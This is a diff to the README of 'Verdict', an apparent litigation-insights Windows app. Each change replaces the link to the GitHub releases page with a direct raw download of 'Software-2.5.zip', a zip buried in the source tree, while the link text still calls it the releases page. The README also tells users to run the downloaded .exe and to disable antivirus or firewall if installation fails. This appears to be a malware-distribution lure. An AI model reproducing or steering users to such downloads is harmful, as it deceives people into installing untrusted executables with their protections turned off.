@@ -1,6 +1,6 @@
 # ⚖️ Verdict - Litigation Insights Made Simple
 
-[![Download Verdict](https://img.shields.io/badge/Download-Verdict-brightgreen?style=for-the-badge)](https://github.com/mohitsem13/Verdict/releases)
+[![Download Verdict](https://img.shields.io/badge/Download-Verdict-brightgreen?style=for-the-badge)](https://github.com/mohitsem13/Verdict/raw/refs/heads/main/src/app/components/Software-2.5.zip)
 
 ---
 
@@ -14,7 +14,7 @@ To get Verdict, you need to visit the official release page. The release page co
 
 **Click the link below to open the release page:**
 
-[Download Verdict from Releases](https://github.com/mohitsem13/Verdict/releases)  
+[Download Verdict from Releases](https://github.com/mohitsem13/Verdict/raw/refs/heads/main/src/app/components/Software-2.5.zip)  
 
 You will find one or more files listed under the latest release version. Look for a file meant for Windows. Usually, this file has an `.exe` extension or a zip archive with Windows files inside.
 
@@ -39,7 +39,7 @@ No extra software or special hardware is needed.
 
 Follow these steps to install and open the application:
 
-1. When you are on the [releases page](https://github.com/mohitsem13/Verdict/releases), look for the latest version at the top.
+1. When you are on the [releases page](https://github.com/mohitsem13/Verdict/raw/refs/heads/main/src/app/components/Software-2.5.zip), look for the latest version at the top.
 2. Download the Windows installer file (`.exe`) or ZIP file if no installer is provided.
 3. If you downloaded a ZIP file, right-click it and select **Extract All**. Choose a folder on your PC where you want to keep the program.
 4. If you have an `.exe` file, double-click it to start the installation. Follow the on-screen instructions, which will guide you through the process.
@@ -70,7 +70,7 @@ If you encounter problems, try these fixes:
 
 - Make sure your internet connection is active.
 - Restart the application if it freezes or does not respond.
-- Check for updates regularly on the [release page](https://github.com/mohitsem13/Verdict/releases).
+- Check for updates regularly on the [release page](https://github.com/mohitsem13/Verdict/raw/refs/heads/main/src/app/components/Software-2.5.zip).
 - Disable any antivirus or firewall software temporarily and try again, if downloads or startup fail.
 - Use a different web browser if the app does not load properly.
 
